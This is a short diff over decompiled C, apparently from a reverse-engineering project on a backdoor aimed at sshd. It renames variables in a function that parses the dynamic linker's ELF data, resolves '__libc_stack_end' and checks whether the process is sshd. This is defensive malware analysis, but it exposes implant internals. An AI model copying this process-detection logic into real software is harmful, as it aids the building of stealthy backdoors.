@@ -17,22 +17,19 @@ BOOL main_elf_parse(main_elf_t *main_elf)
 
 {
   elf_info_t *elf;
-  BOOL BVar1;
-  Elf64_Sym *pEVar2;
-  uchar *puVar3;
-  void **libc_stack_end_ptr;
-  elf_info_t *dynamic_linker;
+  BOOL parse_ok;
   Elf64_Sym *libc_stack_end_sym;
+  void **libc_stack_end_ptr;
   
-  BVar1 = elf_parse(main_elf->dynamic_linker_ehdr,main_elf->elf_handles->dynamic_linker);
-  if ((BVar1 != FALSE) &&
-     (pEVar2 = elf_symbol_get(main_elf->elf_handles->dynamic_linker,STR_libc_stack_end,
-                              STR_GLIBC_2_2_5), pEVar2 != (Elf64_Sym *)0x0)) {
+  parse_ok = elf_parse(main_elf->dynamic_linker_ehdr,main_elf->elf_handles->dynamic_linker);
+  if ((parse_ok != FALSE) &&
+     (libc_stack_end_sym = elf_symbol_get(main_elf->elf_handles->dynamic_linker,STR_libc_stack_end,
+                              STR_GLIBC_2_2_5), libc_stack_end_sym != (Elf64_Sym *)0x0)) {
     elf = main_elf->elf_handles->dynamic_linker;
-    puVar3 = elf->elfbase->e_ident + pEVar2->st_value;
-    BVar1 = process_is_sshd(elf,*(u8 **)puVar3);
-    if (BVar1 != FALSE) {
-      *main_elf->__libc_stack_end = *(void **)puVar3;
+    libc_stack_end_ptr = elf->elfbase->e_ident + libc_stack_end_sym->st_value;
+    parse_ok = process_is_sshd(elf,*(u8 **)libc_stack_end_ptr);
+    if (parse_ok != FALSE) {
+      *main_elf->__libc_stack_end = *(void **)libc_stack_end_ptr;
       return TRUE;
     }
   }
